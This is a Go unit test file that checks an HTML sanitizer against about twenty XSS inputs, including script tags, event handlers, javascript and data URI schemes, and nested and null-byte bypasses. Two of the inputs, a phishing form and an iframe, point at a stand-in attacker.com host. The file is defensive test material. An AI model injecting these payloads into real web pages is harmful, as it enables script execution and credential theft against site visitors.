package sanitizer_test

import (
	"strings"
	"testing"

	"pidiekab/internal/platform/sanitizer"
)

func TestSanitizeHTML_XSSAttackVectors(t *testing.T) {
	tests := []struct {
		name     string
		input    string
		disallow []string
	}{
		{
			name:     "Basic script tag",
			input:    "<script>alert('XSS')</script>",
			disallow: []string{"<script", "alert", "</script>"},
		},
		{
			name:     "Case variation script tag",
			input:    "<ScRiPt>alert(1)</sCrIpT>",
			disallow: []string{"<script", "<ScRiPt", "alert(1)"},
		},
		{
			name:     "Image error handler",
			input:    `<img src="invalid.jpg" onerror="alert('XSS')">`,
			disallow: []string{"onerror", "alert"},
		},
		{
			name:     "Image error handler without quotes",
			input:    `<img src=x onerror=alert(1)>`,
			disallow: []string{"onerror", "alert(1)"},
		},
		{
			name:     "SVG onload handler",
			input:    `<svg onload=alert('XSS')>`,
			disallow: []string{"<svg", "onload", "alert"},
		},
		{
			name:     "Body onload handler",
			input:    `<body onload=alert('XSS')><p>Hello</p></body>`,
			disallow: []string{"<body", "onload", "alert"},
		},
		{
			name:     "Details ontoggle handler",
			input:    `<details open ontoggle=alert(1)><summary>Click</summary></details>`,
			disallow: []string{"ontoggle", "alert(1)"},
		},
		{
			name:     "Marquee disruption and onstart",
			input:    `<marquee onstart=alert(1)>Warning</marquee>`,
			disallow: []string{"<marquee", "onstart", "alert(1)"},
		},
		{
			name:     "Javascript scheme in href",
			input:    `<a href="javascript:alert(1)">Click me</a>`,
			disallow: []string{"javascript:", "alert(1)"},
		},
		{
			name:     "Obfuscated javascript scheme with whitespace",
			input:    `<a href="  java script : alert(1) ">Click</a>`,
			disallow: []string{"alert(1)"},
		},
		{
			name:     "VBScript scheme in src",
			input:    `<img src="vbscript:msgbox(1)">`,
			disallow: []string{"vbscript:", "msgbox"},
		},
		{
			name:     "Data URI scheme in href",
			input:    `<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">Payload</a>`,
			disallow: []string{"data:text/html"},
		},
		{
			name:     "Phishing form injection",
			input:    `<form action="http://attacker.com/steal"><input name="pwd"><button>Send</button></form>`,
			disallow: []string{"<form", "attacker.com/steal", "<input", "<button"},
		},
		{
			name:     "CSS style injection",
			input:    `<style>body{background:red !important;}</style><p>Text</p>`,
			disallow: []string{"<style", "background:red", "</style>"},
		},
		{
			name:     "CSS injection in style attribute",
			input:    `<p style="background:url(javascript:alert(1))">Styling</p>`,
			disallow: []string{"javascript:alert(1)", "url("},
		},
		{
			name:     "Iframe injection",
			input:    `<iframe src="http://attacker.com/phish"></iframe>`,
			disallow: []string{"<iframe", "attacker.com"},
		},
		{
			name:     "Nested script tag bypass",
			input:    `<scr<script>ipt>alert('nested')</script>`,
			disallow: []string{"<script", "alert('nested')"},
		},
		{
			name:     "Null byte injection",
			input:    "<scri\x00pt>alert('nullbyte')</script>",
			disallow: []string{"<script", "alert('nullbyte')"},
		},
		{
			name:     "Newline inside event handler",
			input:    "<img src=\"x\"\nonerror\n=\nalert(1)>",
			disallow: []string{"onerror", "alert(1)"},
		},
		{
			name:     "Attribute breakout",
			input:    `"><script>alert(1)</script>`,
			disallow: []string{"<script", "alert(1)"},
		},
	}

	for _, tt := range tests {
		t.Run(tt.name, func(t *testing.T) {
			result := sanitizer.SanitizeHTML(tt.input)
			lowRes := strings.ToLower(result)
			for _, bad := range tt.disallow {
				if strings.Contains(lowRes, strings.ToLower(bad)) {
					t.Errorf("SanitizeHTML(%q) = %q; failed to strip dangerous pattern %q", tt.input, result, bad)
				}
			}
		})
	}
}

func TestSanitizeHTML_PreservesSafeContent(t *testing.T) {
	input := `<div style="max-width:800px;margin:0 auto;">` +
		`<h1>Judul Halaman</h1>` +
		`<p>Ini adalah paragraf dengan <strong>teks tebal</strong> dan <em>teks miring</em>.</p>` +
		`<ul><li>Poin 1</li><li>Poin 2</li></ul>` +
		`<a href="https://example.com/info">Tautan Luar</a>` +
		`<a href="/id/tentang-pidie/">Tautan Lokal</a>` +
		`<img src="/uploads/gambar.jpg" alt="Gambar">` +
		`</div>`

	cleaned := sanitizer.SanitizeHTML(input)

	if !strings.Contains(cleaned, "<h1>Judul Halaman</h1>") {
		t.Errorf("expected h1 tag to be preserved, got %q", cleaned)
	}
	if !strings.Contains(cleaned, "<strong>teks tebal</strong>") {
		t.Errorf("expected strong tag to be preserved, got %q", cleaned)
	}
	if !strings.Contains(cleaned, "<li>Poin 1</li>") {
		t.Errorf("expected li tag to be preserved, got %q", cleaned)
	}
	// Verify external link has nofollow noopener noreferrer
	if !strings.Contains(cleaned, `rel="nofollow noopener noreferrer" target="_blank"`) {
		t.Errorf("expected external link to receive nofollow and target blank, got %q", cleaned)
	}
	// Verify local link does NOT get nofollow
	if strings.Contains(cleaned, `href="/id/tentang-pidie/" rel="nofollow`) {
		t.Errorf("local link should not have rel=nofollow, got %q", cleaned)
	}
}
